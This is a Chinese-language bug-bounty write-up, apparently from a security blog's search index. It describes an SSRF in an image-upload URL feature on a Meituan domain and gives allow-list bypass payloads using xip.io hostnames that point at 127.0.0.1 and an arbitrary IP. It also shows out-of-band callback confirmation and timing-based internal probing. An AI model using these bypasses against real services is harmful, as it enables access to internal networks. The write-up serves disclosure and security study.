        <content type="html"><![CDATA[<p>1、打开Url：<a href="http://xxx.com/profile" target="_blank" rel="noopener">http://xxx.com/profile</a> ，然后选择一个图片上传然后抓包发现有如下请求</p><p><img src="http://static.zybuluo.com/1kbfree/27tbui8q7e9x7ravx8jivzdk/1.png" alt="1.png-220kB"></p><p>然后我猜想这里的处理流程是这样的：</p><ol><li>上传文件后返回包返回一个<code>Url</code></li><li>然后上图那个请求把一部的<code>Url</code>去访问并且使其成为图片地址（应该是读取<code>Url</code>然后把它内容写入~）</li></ol><p>那么以上流程如果<code>Url</code>没有严格过滤的话是会造成<code>SSRF</code>的，但是这里有过滤，但仍可以绕过~</p><pre><code>http://p1.meituan.net.127.0.0.1.xip.io</code></pre><p>上面这个<code>url</code>打开等于打开<code>127.0.0.1</code>（<code>ping</code>一下就知道了）</p><p><img src="http://static.zybuluo.com/1kbfree/n4bivtodu7857uam9n5yh55x/1.png" alt="1.png-24.5kB"></p><p>这里去请求一下我的<code>ceye</code>（和<code>dnslog</code>一样的）</p><p><img src="http://static.zybuluo.com/1kbfree/d3m6dlql5t7zg646b6chlcmv/1.png" alt="1.png-232.5kB"></p><p>然后去我的<code>CEYE</code>去看下~</p><p><img src="http://static.zybuluo.com/1kbfree/t1ejl7jg1dimuvvkr8fx0fwb/image.png" alt="image.png-110.8kB"></p><p>可以看到他这里是有去请求的，那么还可以利用<code>CEYE</code>的<code>DNS Rebinding</code>使其去访问一个<code>ip</code>（比较麻烦），所以这里用另一种方法来使其访问随意一个<code>ip</code></p><pre><code>http://p1.meituan.net.183.232.231.172.xip.io/</code></pre><p>这里的<code>183.232.231.172</code>是我<code>ping</code>百度的<code>ip</code>，然后我打开一下看看~</p><p><img src="http://static.zybuluo.com/1kbfree/lz0psyxavxnf65hxnnclmgv6/1.png" alt="1.png-32.9kB"></p><p>然后放入请求中是可以正常访问的，如图</p><p><img src="http://static.zybuluo.com/1kbfree/yakvfdjz5uwlo28t22u6545v/1.png" alt="1.png-234.5kB"></p><p>那么再测试一个无法访问的<code>ip</code>试试</p><p><img src="http://static.zybuluo.com/1kbfree/q6qy5t0ntzztbjpmlh6sq0p5/1.png" alt="1.png-254.4kB"></p><p>可以看到返回的是<code>504</code>而且请求时间非常的长~ </p><p>下面探测内网的就不展示了。</p><h3 id="漏洞进展"><a href="#漏洞进展" class="headerlink" title="漏洞进展"></a>漏洞进展</h3><p>评级：中<br>奖金：250</p><blockquote><p>因为非核心业务所以给的钱比较少</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞案例 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
